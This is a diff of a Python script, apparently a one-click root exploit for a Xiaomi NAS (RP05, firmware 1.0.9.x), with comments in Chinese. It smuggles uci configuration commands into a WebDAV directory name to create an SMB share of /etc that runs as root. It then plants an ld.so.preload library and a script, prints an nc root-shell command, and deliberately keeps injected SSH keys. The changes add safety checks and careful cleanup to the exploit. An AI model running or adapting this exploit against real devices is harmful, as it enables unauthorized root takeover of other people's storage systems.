@@ -27,9 +27,12 @@ xiaomi-nas-root.py — 小米智能存储 (RP05, 固件 1.0.9.x) 一键获取 ro
 """
 import argparse
 import base64
+import hashlib
 import json
 import os
 import re
+import secrets
+import shlex
 import socket
 import ssl
 import subprocess
@@ -363,17 +366,157 @@ def _smb_write_file(share, name, data, password):
         os.rmdir(mnt)
 
 
-def _disarm_command(uid, weird_name):
+class SmbSetupError(RuntimeError):
+    """SMB state could not be verified; never guess an account ID or retry a write."""
+
+
+def _smb_id(value):
+    if type(value) not in (int, str) or str(value) not in ("1", "2"):
+        raise SmbSetupError("SMB 返回了无效的账号 ID，停止以保护原有配置")
+    return str(value)
+
+
+def _smb_call(nas, operation, body, timeout=15, allowed=(0,)):
+    try:
+        response = nas.json_body(nas.https("/cgi-bin/luci/netshare/" + operation,
+                                           body, timeout=timeout))
+    except OSError as exc:
+        raise SmbSetupError("%s 网络异常（%s）；停止，不自动重试写入" %
+                            (operation, type(exc).__name__)) from exc
+    # 不打印响应原文：账号列表及错误响应可能带密码。
+    if (not isinstance(response, dict) or
+            not re.match(r"^HTTP/\d(?:\.\d)? 2\d\d(?: |$)", response.get("http_status", "")) or
+            type(response.get("code")) is not int):
+        raise SmbSetupError("%s 响应不完整或 HTTP 失败；停止，不将缺失 code 视为成功" % operation)
+    if response["code"] == 2509:
+        raise SmbSetupError("%s: 该账号已存在（2509）；保留原账号和共享配置，不尝试覆盖" % operation)
+    if response["code"] not in allowed:
+        raise SmbSetupError("%s failed (code=%d)；停止，不尝试修改其他账号" %
+                            (operation, response["code"]))
+    return response
+
+
+def _smb_accounts(nas):
+    response = _smb_call(nas, "get_samba_account", {})
+    data = response.get("data")
+    entries = data.get("account") if isinstance(data, dict) else None
+    if not isinstance(entries, list):
+        raise SmbSetupError("SMB 账号列表缺失或格式错误，停止以保护原有配置")
+    accounts = {}
+    for entry in entries:
+        if not isinstance(entry, dict):
+            raise SmbSetupError("SMB 账号记录格式错误")
+        id = _smb_id(entry.get("id"))
+        dirs = entry.get("share_dir")
+        if (id in accounts or not isinstance(entry.get("username"), str) or
+                not isinstance(entry.get("password"), str) or
+                not isinstance(dirs, list) or len(dirs) != 1 or not isinstance(dirs[0], str) or
+                str(entry.get("status")) not in ("0", "1")):
+            raise SmbSetupError("SMB 账号记录不完整或 ID 重复，停止以保护原有配置")
+        accounts[id] = dict(entry, id=id, status=str(entry["status"]))
+    return accounts
+
+
+def _verify_smb_created(nas, original, id, username, password, path):
+    accounts = _smb_accounts(nas)
+    if (set(accounts) != set(original) | {id} or
+            any(accounts.get(key) != entry for key, entry in original.items())):
+        raise SmbSetupError("SMB 原有配置发生变化；停止，不覆盖或清理任何已有记录")
+    created = accounts.get(id)
+    if (id in original or created is None or created["username"] != username or
+            created["password"] != password or created["share_dir"] != [path] or
+            created["status"] != "1"):
+        raise SmbSetupError("无法确认本次新建的 SMB 账号及共享；停止，不猜测 ID 或继续设置")
+    return created
+
+
+def _setup_smb_share(nas, auth):
+    """只在空闲槽位新建本次临时账号；已有账号、密码、路径和启停状态均不复用。"""
+    if not re.fullmatch(r"[0-9]+", nas.uid) or nas.uid != nas.sn.split(".")[1]:
+        raise SmbSetupError("SMB UID 必须与认证证书一致，停止以保护其他用户配置")
+    username = "u" + nas.uid
+    original = _smb_accounts(nas)
+    if any(entry["username"].upper() == username.upper() for entry in original.values()):
+        raise SmbSetupError("SMB 账号 %s 已存在；保留原密码和共享配置，停止，不复用已有账号" % username)
+    # 固件 smb_get_id 只检查 _1：不存在选 1，否则选 2；它不会检查 _2 是否已占用。
+    planned_id = "1" if "1" not in original else "2"
+    if planned_id in original:
+        raise SmbSetupError("SMB 账号槽位已满；保留原账号和共享配置，不覆盖 ID=%s" % planned_id)
+    # get 只返回当前用户的账号；judge 另行检查其他 NAS 用户占用的同名账号。
+    _smb_call(nas, "judge_samba_account", {"username": username})
+
+    section = "%s_%s" % (username, planned_id)
+    weird_name = (
+        "M" + secrets.token_hex(15)[:29] + '\n"\n' +
+        "set sambashare.%s.user_force=root\n" % section +
+        "set sambashare.%s.create_mask=0644\n" % section +
+        "set sambashare.%s.path=etc\n" % section +
+        "set sambashare.%s.comment=" % section
+    )
+    # 独立随机目录，拒绝复用 405，避免清理上次运行或用户原有的目录。
+    enc = urllib.parse.quote(weird_name, safe="")
+    response = nas.webdav("MKCOL", "/pool0/data/" + enc + "/", auth=auth)
+    if not response.split("\r\n", 1)[0].startswith("HTTP/1.1 201 "):
+        raise SmbSetupError("SMB staging MKCOL 未返回 201，停止，不复用已有目录")
+    weird_real = "/home/%s/pool0/data/%s" % (username, weird_name)
+    password = "Rp!" + secrets.token_urlsafe(12)
+    if _smb_accounts(nas) != original:
+        raise SmbSetupError("SMB 配置在预检后发生变化；停止，未新增或设置账号")
+    result = _smb_call(nas, "add_samba_account", {
+        "username": username, "password": password, "share_dir": [weird_real],
+    }, timeout=60, allowed=(0, 2502))
+    created = _verify_smb_created(nas, original, planned_id, username, password, weird_real)
+    actual_id = created["id"]
+    data = result.get("data")
+    if data is not None:
+        if not isinstance(data, dict) or _smb_id(data.get("id")) != actual_id:
+            raise SmbSetupError("SMB 新增返回的 ID 与读回记录不符；停止，不设置或删除任何账号")
+    if result["code"] == 2502:
+        log("warn", "add_samba_account code=2502；已读回确认本次新建 ID=%s，再修复共享路径" % actual_id)
+    else:
+        log("ok", "SMB 临时账号已新建并核对 ID=%s" % actual_id)
+    _smb_call(nas, "set_samba_account", {
+        "id": actual_id, "username": username, "password": password, "share_dir": ["/etc"],
+    }, timeout=120)
+    _verify_smb_created(nas, original, actual_id, username, password, "/etc")
+    return actual_id, weird_name, password
+
+
+def _disarm_command(uid, weird_name, smb_id, smb_password):
     """清理命令（成功与失败路径共用）。覆盖：preload/payload 文件、staging 怪名目录、
     注入的 samba 共享与系统用户。注意 authorized_keys 有意保留（SSH 认证通道）。"""
+    if not re.fullmatch(r"[0-9]+", uid):
+        raise ValueError("invalid cleanup UID")
+    smb_id = _smb_id(smb_id)
+    section = "u%s_%s" % (uid, smb_id)
+    # ID 仍相同不等于仍属本次运行。核对口令指纹和当前配置，变化时不删记录。
+    expected = {
+        "sambauser.%s.id" % section: smb_id,
+        "sambauser.%s.user" % section: "u" + uid,
+        "sambauser.%s.name" % section: "u" + uid,
+        "sambauser.%s.dirs" % section: "/etc",
+        "sambauser.%s.status" % section: "1",
+        "sambashare.%s.name" % section: "etc-" + uid,
+        "sambashare.%s.path" % section: "/etc",
+        "sambashare.%s.users" % section: "sambau" + uid,
+        "sambashare.%s.user_force" % section: "root",
+    }
+    checks = ['[ "$(uci -q get %s)" = %s ]' % (key, shlex.quote(value))
+              for key, value in expected.items()]
+    fingerprint = hashlib.sha256(smb_password.encode()).hexdigest()
+    checks.append('[ "$(printf \'%s\' "$(uci -q get sambauser.%s.passwd)" | '
+                  'sha256sum | cut -d \' \' -f 1)" = %s ]' % ("%s", section, fingerprint))
+    staging = shlex.quote("/home/u%s/pool0/data/%s" % (uid, weird_name))
     return ("rm -f /etc/ld.so.preload /etc/pwn.so /etc/.rootpwn.sh /etc/.rootpwn.log; "
-            "rm -rf '/home/u%s/pool0/data/%s'; "
-            "uci delete sambashare.u%s_2; uci commit sambashare; "
-            "uci delete sambauser.u%s_2 2>/dev/null; uci commit sambauser; "
-            "sed -i '/sambau%s/d' /etc/passwd /etc/shadow 2>/dev/null; "
-            "nas call smb_mgr.sh restart 2>/dev/null || systemctl restart smb nmb 2>/dev/null; "
-            "echo CLEAN_OK"
-            ) % (uid, weird_name.replace("'", "'\\''"), uid, uid, uid)
+            "if %s; then "
+            "if rm -rf %s && "
+            "uci delete sambashare.%s && uci commit sambashare && "
+            "uci delete sambauser.%s && uci commit sambauser && "
+            "sed -i '/^sambau%s:/d' /etc/passwd /etc/shadow && "
+            "(nas call smb_mgr.sh restart 2>/dev/null || systemctl restart smb nmb 2>/dev/null); "
+            "then echo CLEAN_OK; else echo SMB_CLEAN_FAILED; fi; "
+            "else echo SMB_CLEAN_SKIP; fi"
+            ) % (" && ".join(checks), staging, section, section, uid)
 
 
 def _cleanup_via_shell(args, disarm):
@@ -400,6 +543,8 @@ def _cleanup_via_shell(args, disarm):
                 if "CLEAN_OK" in (res.stdout or ""):
                     log("ok", "清理完成（preload/共享/staging 已清除）")
                     return
+                if "SMB_CLEAN_SKIP" in (res.stdout or ""):
+                    log("warn", "SMB 配置已变化或不再属于本次运行；保留账号和共享，跳过删除")
             except (OSError, sp.TimeoutExpired) as exc:
                 log("warn", "清理执行异常（%s），降级到手动方式" % type(exc).__name__)
         _dump_manual_cleanup(args, disarm)
@@ -454,49 +599,11 @@ def main():
 
     # ---------- ② uci heredoc injection → root share ----------
     log("step", "uci 注入: 建立 force user=root 的 /etc SMB 共享")
-    NL = chr(10)
-    Q = chr(34)
-    M30 = "M" * 30
-    weird_name = (
-        M30 + NL + Q + NL +
-        "set sambashare.u%s_2.user_force=root" % nas.uid + NL +
-        "set sambashare.u%s_2.create_mask=0644" % nas.uid + NL +
-        "set sambashare.u%s_2.path=etc" % nas.uid + NL +
-        "set sambashare.u%s_2.comment=" % nas.uid
-    )
-    enc = urllib.parse.quote(weird_name, safe="")
-    # /pool0 为单池默认布局（get_pool_info 的 data_dir 即 /pool0/data）；多池设备需按实际调整
-    r = nas.webdav("MKCOL", "/pool0/data/" + enc + "/", auth=auth)
-    status = r.split("\r\n")[0]
-    if not status.startswith("HTTP/1.1 201") and not status.startswith("HTTP/1.1 405"):
-        die("MKCOL failed: %s" % status)
-    log("ok", "staging dir created (newline-injected name)")
-
-    weird_real = "/home/u%s/pool0/data/%s" % (nas.uid, weird_name)
-    # 临时 SMB 口令每次运行随机生成（限内网、窗口仅几分钟，固定口令改为随机的防御纵深）
-    import secrets
-    smb_password = "Rp!" + secrets.token_urlsafe(12)
-    j = nas.json_body(nas.https("/cgi-bin/luci/netshare/add_samba_account",
-                                {"username": "u" + nas.uid, "password": smb_password,
-                                 "share_dir": [weird_real]}, timeout=60))
-    # add 失败不区分原因直接试 set（A4：原实现把解析失败当成功再叠加误判）；
-    # id=2 是 smb_get_id 的固定结果（用户首个共享为 1，第二个为 2），非硬编码魔法数
-    if j.get("code") not in (0, None):
-        j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
-                                    {"id": "2", "username": "u" + nas.uid, "password": smb_password,
-                                     "share_dir": [weird_real]}, timeout=90))
-    code = j.get("code")
-    log("info" if code in (0, None) else "warn", "add_samba_account code=%s (2502 restart-fail 可继续)" % code)
-    # note: restart failure is fine — the uci entries are already written; repair below
-    time.sleep(5)
-
-    # repair: point share to clean /etc path via set (keeps user_force=root)
-    j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
-                                {"id": "2", "username": "u" + nas.uid, "password": smb_password,
-                                 "share_dir": ["/etc"]}, timeout=120))
-    if j.get("code") not in (0, None) or " 20" not in j.get("http_status", ""):
-        die("share repair failed: %s" % j)
-    log("ok", "SMB /etc share active as user u%s (force user=root)" % nas.uid)
+    try:
+        smb_id, weird_name, smb_password = _setup_smb_share(nas, auth)
+    except SmbSetupError as exc:
+        die(str(exc))
+    log("ok", "SMB /etc share configured as user u%s (ID=%s)" % (nas.uid, smb_id))
 
     # ---------- ③ preload trigger ----------
     log("step", "写入 /etc/ld.so.preload + 触发 .so (cron 每分钟生效)")
@@ -523,9 +630,9 @@ def main():
     ])
 
     # /etc 写入走 SMB root 共享（WebDAV 路由层拒绝 /etc，实测 451）。
-    # 共享名 = <怪目录名 basename 前 30 字符>-<uid>，账号 u<uid>（步骤②创建）
-    share = "\\\\%s\\%s-%s" % (args.ip, weird_name[:30], nas.uid)
-    disarm = _disarm_command(nas.uid, weird_name)
+    # 固件 set_samba_account 会按新路径 /etc 把共享名改成 etc-<uid>。
+    share = "\\\\%s\\etc-%s" % (args.ip, nas.uid)
+    disarm = _disarm_command(nas.uid, weird_name, smb_id, smb_password)
     try:
         _smb_write_file(share, ".rootpwn.sh", payload.encode(), smb_password)
         _smb_write_file(share, "pwn.so", open(so_local, "rb").read(), smb_password)
@@ -572,7 +679,7 @@ def main():
     print("   root shell:  nc %s %d   (或 wsl: wsl bash -c 'nc %s %d')" % (args.ip, args.shell_port, args.ip, args.shell_port))
     print("   SSH:        ssh -i %s root@%s   (公钥已注入; dropbear exec bug 下认证可用)" % (keyp, args.ip))
     print("   会话性质:   未做重启持久化——socat shell 与 dropbear.socket 重启后消失;")
-    print("               清理已执行(preload/注入共享/临时目录/samba 账号行)。注意:/etc/dropbear/")
+    print("               清理已尝试（结果以清理日志为准）。注意:/etc/dropbear/")
     print("               authorized_keys 与 /home/rootx/.ssh/authorized_keys 中的公钥保留(SSH")
     print("               认证通道重启后仍可用), 如需彻底移除: 删除这两个文件并把 passwd 中")
     print("               root 的 home 改回 /root")
